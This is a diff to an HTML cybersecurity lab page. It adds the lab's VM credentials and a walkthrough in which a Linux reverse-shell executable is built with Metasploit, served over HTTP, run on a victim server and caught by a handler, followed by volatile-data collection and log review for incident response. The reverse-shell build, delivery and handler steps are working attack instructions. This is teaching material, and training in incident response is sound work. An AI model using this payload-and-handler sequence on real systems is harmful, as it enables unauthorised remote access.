@@ -210,6 +210,20 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 .rel-no{font-family:var(--mono);font-size:.7rem;font-weight:700;letter-spacing:.07em;color:var(--muted)}
 .rel-ttl{font-weight:700;font-size:.96rem}
 .rel-why{font-size:.84rem;color:var(--muted)}
+
+.callout.tip{border-left-color:var(--accent);background:color-mix(in srgb,var(--accent) 10%,transparent)}
+.callout.tip .tag{color:var(--accent)}
+.step .snum{display:inline-flex;align-items:center;justify-content:center;min-width:1.5em;height:1.5em;
+  padding:0 .35em;margin-right:.5em;border-radius:6px;background:var(--card-2);border:1px solid var(--line);
+  color:var(--accent);font-family:var(--mono);font-weight:700;font-size:.82em;vertical-align:baseline}
+.env-wrap{overflow-x:auto;margin:6px 0 10px}
+.env-table{width:100%;border-collapse:collapse;font-size:.92rem;min-width:460px}
+.env-table caption{text-align:left;color:var(--muted);font-size:.85rem;margin-bottom:8px}
+.env-table th,.env-table td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+.env-table thead th{color:var(--accent);font-size:.74rem;letter-spacing:.06em;text-transform:uppercase;border-bottom:2px solid var(--line)}
+.env-table td code,.env-table th code{font-family:var(--mono);font-size:.86em}
+.env-table tbody tr:hover{background:var(--card-2)}
+.env-note{color:var(--muted);font-size:.86rem;margin-top:6px}
 </style>
 </head>
 <body>
@@ -258,6 +272,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 
   <nav class="section-nav" id="sectionNav" aria-label="Jump to section">
     <a class="nav-btn" href="#overview" data-nav="overview"><span class="done" aria-hidden="true">✓</span>📋 Overview</a>
+     <a class="nav-btn" href="#environment" data-nav="environment"><span class="done" aria-hidden="true">✓</span>🖥️ Environment</a>
     <a class="nav-btn" href="#walkthrough" data-nav="walkthrough"><span class="done" aria-hidden="true">✓</span>🧭 Walkthrough</a>
     <a class="nav-btn" href="#stuck" data-nav="stuck"><span class="done" aria-hidden="true">✓</span>⚠️ Where students get stuck</a>
     <a class="nav-btn" href="#defender" data-nav="defender"><span class="done" aria-hidden="true">✓</span>🛡️ Defender's view</a>
@@ -277,29 +292,158 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
       <label class="review"><input type="checkbox" data-review="overview"> Mark this section reviewed</label>
     </section>
 
+    <section class="lab-section" id="environment" data-section="environment">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">🖥️</span> Environment &amp; credentials</h2>
+      <p class="section-lead">Everything you need to log in and work the lab. These are the fixed NETLAB+ pod values for this lab.</p>
+      <div class="env-wrap">
+        <table class="env-table">
+          <caption>Virtual machines in this lab's pod</caption>
+          <thead><tr><th>Virtual machine</th><th>IP address</th><th>Account</th><th>Password</th></tr></thead>
+          <tbody><tr><td><b>Kali</b></td><td><code>203.0.113.2</code></td><td><code>kali</code></td><td><code>kali</code></td></tr><tr><td><b>pfSense</b></td><td><code>192.168.0.1</code></td><td><code>sysadmin</code></td><td><code>NDGlabpass123!</code></td></tr><tr><td><b>UbuntuSRV</b></td><td><code>172.16.1.10</code></td><td><code>sysadmin</code></td><td><code>NDGlabpass123!</code></td></tr></tbody>
+        </table>
+      </div>
+      <p class="env-note">Log in exactly as shown — usernames and passwords are case-sensitive. These credentials are the same every time the pod is reset.</p>
+      <label class="review"><input type="checkbox" data-review="environment"> Mark this section reviewed</label>
+    </section>
+
     <section class="lab-section" id="walkthrough" data-section="walkthrough">
       <h2 class="section-title"><span class="ico" aria-hidden="true">🧭</span> The walkthrough</h2>
       <p class="section-lead">Stage it, then respond to it — don't conflate the two roles.</p>
-      <div class="subsection"><span class="phase-tag">Phase 1 · Stage the incident (attacker)</span>
-        <h3>A Linux reverse shell</h3>
-        <div class="code-block"><span class="pr">kali@kali$</span> msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=... -f elf -o linux
-<span class="pr">kali@kali$</span> python3 -m http.server            <span class="cmt"># host it</span>
-<span class="pr">kali@kali$</span> msfconsole
-<span class="pr">msf6&gt;</span> use exploit/multi/handler
-<span class="pr">msf6&gt;</span> set payload linux/x64/shell_reverse_tcp
-<span class="pr">msf6&gt;</span> exploit</div>
-        <p class="why">Same pattern as Lab 01, aimed at Linux: build an ELF payload, serve it, run it on the victim, catch the session. This creates the compromise you'll investigate — and, usefully, the live connection it opens will show up in your evidence collection.</p>
-      </div>
-      <div class="subsection"><span class="phase-tag">Phase 2 · Respond — collect volatile data</span>
-        <h3>Grab the fleeting evidence, in order</h3>
-        <div class="code-block"><span class="pr">sysadmin@ubuntusrv$</span> sudo su
-<span class="pr">root@ubuntusrv#</span> date >> report.txt          <span class="cmt"># timestamp the collection</span>
-<span class="pr">root@ubuntusrv#</span> hostname >> report.txt
-<span class="pr">root@ubuntusrv#</span> ifconfig -a >> report.txt      <span class="cmt"># network config</span>
-<span class="pr">root@ubuntusrv#</span> netstat -ano >> report.txt      <span class="cmt"># active connections — the reverse shell shows here</span></div>
-        <p class="why">As root, append the volatile state to a report: time first (so every finding is anchored), then host identity, network configuration, and <strong>active connections</strong> — where the attacker's reverse shell is visible. The ordering reflects volatility: capture live network and process state before touching slower, more persistent sources.</p>
-          <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the report.txt showing netstat with the suspicious active connection.</span></div>
-      </div>
+<div class="subsection"><span class="phase-tag">Task 1</span><h3>Build Malicious Executables to Attack a Remote System</h3>
+</div>
+<div class="subsection"><span class="phase-tag">Task 1.1</span><h3>Build Malicious Linux Executable</h3>
+<div class="step"><p><span class="snum">1</span> Launch the Kali virtual machine to access the graphical login screen.</p>
+</div>
+<div class="step"><p><span class="snum">2</span> Log in as username kali with kali as the password.</p>
+</div>
+<div class="step"><p><span class="snum">3</span> Click on the terminal icon located in the top menu bar.</p>
+</div>
+<div class="step"><p><span class="snum">4</span> For the purpose of learning how to build a malicious Linux executable file and incidence response, we will ignore the social engineering process. Now, let's build a malicious Linux executable. First, we will create a directory to place the executable in. In the Terminal window, as shown below, type the command mkdir malicious and then press Enter. Then, cd malicious to go into the directory.</p>
+</div>
+<div class="step"><p><span class="snum">5</span> While inside the malicious directory, type and run the command msfconsole to start Metasploit. kali@kali $ msfconsole</p>
+</div>
+<div class="step"><p><span class="snum">6</span> Type the following command to search for the payload for the 64-bit Linux operating system. kali@kali $ search linux/x64/shell_reverse_tcp</p>
+</div>
+<div class="step"><p><span class="snum">7</span> Type use 0 to use the payload. Notice the prompt now says payload(linux/x64/shell_reverse_tcp). This indicates that we are using this payload now.</p>
+</div>
+<div class="step"><p><span class="snum">8</span> We will then see what options are available by running the command show options. We can see there are two options available: LHOST and LPORT. Currently, LPORT is set, and we need to configure the LHOST.</p>
+</div>
+<div class="step"><p><span class="snum">9</span> Type command set LHOST 203.0.113.2 to set the local listen address.</p>
+</div>
+<div class="step"><p><span class="snum">10</span> With everything set and ready, let's create the malicious executable. Type the command below: kali@kali $ generate -f elf -o linux</p>
+</div>
+<div class="step"><p><span class="snum">11</span> A file named linux is created inside the malicious directory. Before we offer the malicious executable to the victim, let's prepare a listener first. In your Metasploit console, type the command below to use a handler. kali@kali $ use exploit/multi/handler</p>
+</div>
+<div class="step"><p><span class="snum">12</span> Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp. This payload will not handle our linux reverse shell, so let's change it by entering the following command: kali@kali $ set payload linux/x64/shell_reverse_tcp</p>
+</div>
+<div class="step"><p><span class="snum">13</span> Once again, we will check the options. Notice the payload is correct now, but we still need to change the LHOST.</p>
+</div>
+<div class="step"><p><span class="snum">14</span> Type the same command as we did before to change the LHOST.</p>
+<div class="callout tip"><span class="tag">[NOTE]</span> You can use setg LHOST local.ip.address.here to save the time on configuring the LHOST addresses. The setg will set the LHOST as a global variable. So, when its set, every module, payload that accepts LHOST will refer to the same entry.</div>
+</div>
+<div class="step"><p><span class="snum">15</span> We will now run the handler to wait for a reverse connection. Run the command exploit and leave the Terminal window open.</p>
+</div>
+</div>
+<div class="subsection"><span class="phase-tag">Task 1.2</span><h3>Hosting the Malicious Executable</h3>
+<div class="step"><p><span class="snum">1</span> Click on the Terminal icon located in the top menu bar to start a new Terminal.</p>
+</div>
+<div class="step"><p><span class="snum">2</span> In the new Terminal window, type the command shown to go to the malicious directory.</p>
+</div>
+<div class="step"><p><span class="snum">3</span> Type ls -l to check the content in the malicious directory. Make sure the linux file is present.</p>
+</div>
+<div class="step"><p><span class="snum">4</span> Now everything is ready, let's start a simple HTTP server using the Python3 module. Type the following command to start the HTTP server. kali@kali $ python3 -m http.server</p>
+</div>
+</div>
+<div class="subsection"><span class="phase-tag">Task 1.3</span><h3>Using the Metasploit Handler</h3>
+<div class="step"><p><span class="snum">1</span> Launch the UbuntuSRV virtual machine to access the graphical login screen.</p>
+</div>
+<div class="step"><p><span class="snum">2</span> Log in as sysadmin with NDGlabpass123! as the password.</p>
+</div>
+<div class="step"><p><span class="snum">3</span> Open the Firefox web browser by clicking on the Firefox icon located on the dock.</p>
+</div>
+<div class="step"><p><span class="snum">4</span> Go to the address http://203.0.113.2:8000.</p>
+</div>
+<div class="step"><p><span class="snum">5</span> We will click on the linux link to download the malicious linux executable file.</p>
+</div>
+<div class="step"><p><span class="snum">6</span> When prompted, click the Save File button.</p>
+</div>
+<div class="step"><p><span class="snum">7</span> Look for the down arrow at the top right corner of the Firefox browser and click it. Then, click the File icon to open the Downloads directory. A window will open with the linux file inside.</p>
+</div>
+<div class="step"><p><span class="snum">8</span> In the window, right-click an empty space and select Open in Terminal.</p>
+</div>
+<div class="step"><p><span class="snum">9</span> Type the following commands to add the executable rights and run the linux program. You will see a blinking cursor.</p>
+<div class="code-block"><span class="pr">sysadmin@ubuntusrv:~/Downloads$</span> chmod 755 linux</div>
+<div class="code-block"><span class="pr">sysadmin@ubuntusrv:~/Downloads$</span> ./linux</div>
+</div>
+<div class="step"><p><span class="snum">10</span> Change back to the Kali machine. You will see the handler now has a session opened.</p>
+</div>
+<div class="step"><p><span class="snum">11</span> The session is interactive; click the Terminal window in Kali to make it active. Type whoami to check the user we are connected as, then run pwd to check the working directory. We now have access to the UbuntuSRV machine. Leave the kali window open to continue the next task.</p>
+</div>
+</div>
+<div class="subsection"><span class="phase-tag">Task 2</span><h3>Collecting Volatile Data</h3>
+</div>
+<div class="subsection"><span class="phase-tag">Task 2.1</span><h3>Collecting Volatile Data on a Compromised System</h3>
+<div class="step"><p><span class="snum">1</span> Once a system has been compromised, it is important to get some information off the system before it is shut down. Any data residing in RAM will be gone when the system is shut down. Change focus to the UbuntuSRV system</p>
+</div>
+<div class="step"><p><span class="snum">2</span> On the UbuntuSRV system, in the Terminal that still has the malicious executable running, click the + new tab button.</p>
+</div>
+<div class="step"><p><span class="snum">3</span> In the new Terminal tab, enter the command sudo su to escalate to root privileges. If prompted, enter NDGlabpass123! as the password.</p>
+</div>
+<div class="step"><p><span class="snum">4</span> Create a file to contain any volatile data we can find. To put a heading into the file, enter the command below.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> echo sysadmin investigator &gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">5</span> Verify the report.txt file has been created with the student investigator title.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> cat report.txt</div>
+</div>
+<div class="step"><p><span class="snum">6</span> Add the date and timestamp to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> date &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">7</span> Print the system information to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> uname -a &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">8</span> Add the hostname to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           hostname &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">9</span> Append network interface information to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           ifconfig -a &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">10</span> Append network statistics to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           netstat -ano &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">11</span> Append the process services running to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           ps -aux &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">12</span> Append the routing table to the report.txt file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           route -n &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">13</span> Append the date and timestamp to the report.txt once more at the end of the file.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span>                           date &gt;&gt; report.txt</div>
+</div>
+<div class="step"><p><span class="snum">14</span> View output content from the report.txt. Press the spacebar to scroll down by page or press Enter to scroll down by a single line.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> cat report.txt | less</div>
+</div>
+<div class="step"><p><span class="snum">15</span> When finished reviewing the contents, press Q to exit.</p>
+</div>
+<div class="step"><p><span class="snum">16</span> Leave the Terminal shell open to continue with the next task.</p>
+</div>
+</div>
+<div class="subsection"><span class="phase-tag">Task 3</span><h3>Viewing Logs</h3>
+</div>
+<div class="subsection"><span class="phase-tag">Task 3.1</span><h3>Analyzing Different Log File and Knowing Their Importance</h3>
+<div class="step"><p><span class="snum">1</span> While in the Terminal shell, on the UbuntuSRV system, enter the command below to view the content of the auth.log file. This file actively logs system authorization information.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> cat /var/log/auth.log | less</div>
+</div>
+<div class="step"><p><span class="snum">2</span> When finished reviewing the contents, press Q to exit.</p>
+</div>
+<div class="step"><p><span class="snum">3</span> Type the command below to view the contents of the btmp log file. This files logs failed login attempts.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> last -f /var/log/btmp | more</div>
+</div>
+<div class="step"><p><span class="snum">4</span> Type the command below to view the contents of the wtmp log file. This file logs login records to view who is currently connected to the system.</p>
+<div class="code-block"><span class="pr">root@ubuntusrv:/home/sysadmin/Downloads#</span> last -f /var/log/wtmp | more</div>
+</div>
+<div class="step"><p><span class="snum">5</span> The lab is now complete; you may end the reservation.</p>
+</div>
+</div>
       <label class="review"><input type="checkbox" data-review="walkthrough"> Mark this section reviewed</label>
     </section>
 
